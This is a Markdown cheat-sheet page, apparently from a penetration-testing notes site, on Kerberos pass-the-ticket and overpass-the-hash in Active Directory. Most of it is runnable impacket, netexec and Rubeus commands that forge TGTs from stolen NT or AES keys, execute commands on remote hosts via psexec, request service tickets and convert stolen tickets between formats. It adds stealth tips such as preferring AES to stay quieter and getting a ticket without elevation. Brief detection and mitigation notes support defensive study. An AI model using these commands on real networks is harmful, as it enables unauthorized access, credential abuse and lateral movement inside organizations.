---
title: Pass-the-ticket & OverPass-the-hash
category: AD / Lateral Movement
order: 20
tags: [kerberos, ptt, overpass, ccache, kirbi, s4u]
summary: >
  Reuse Kerberos tickets instead of passwords. OverPass-the-hash turns an NT/AES
  key into a TGT; pass-the-ticket injects an existing TGT/TGS. Converting between
  Windows (.kirbi) and Linux (.ccache) formats lets you move tickets between boxes.
prerequisites:
  - An NT/AES key (overpass) or an existing ticket (ptt)
  - Clock within 5 min of the DC (Kerberos skew)
tools: [impacket (getTGT, getST, ticketConverter), Rubeus, netexec]
detection:
  - 4768/4769 with RC4 when the environment is AES; tickets used from an unusual host
mitigation:
  - AES-only; Protected Users (no NTLM, short TGT); monitor ticket anomalies
refs:
  - { label: "The Hacker Recipes — PtT", url: "https://www.thehacker.recipes/ad/movement/kerberos/ptt" }
---

## OverPass-the-hash (key → TGT)

```sh
getTGT.py $domain/$user -hashes :$nthash -dc-ip $dc_ip
getTGT.py $domain/$user -aesKey $aeskey -dc-ip $dc_ip     # quieter than RC4/NT
export KRB5CCNAME=$user.ccache
```

## Use the ticket

```sh
netexec smb $target -k --use-kcache -x 'whoami'
psexec.py -k -no-pass $target
# request a service ticket from your TGT
getST.py -k -no-pass -spn cifs/$target -dc-ip $dc_ip $domain/$user
```

## Convert between formats

```sh
# Windows .kirbi  <->  Linux .ccache
ticketConverter.py ticket.kirbi ticket.ccache
ticketConverter.py ticket.ccache ticket.kirbi
# a Rubeus base64 blob -> file -> convert
echo '<b64>' | base64 -d > ticket.kirbi && ticketConverter.py ticket.kirbi ticket.ccache
```

> `tgtdeleg` (Rubeus) hands you a usable TGT for the current user **without
> elevation** — a clean way to get a ticket to move with.
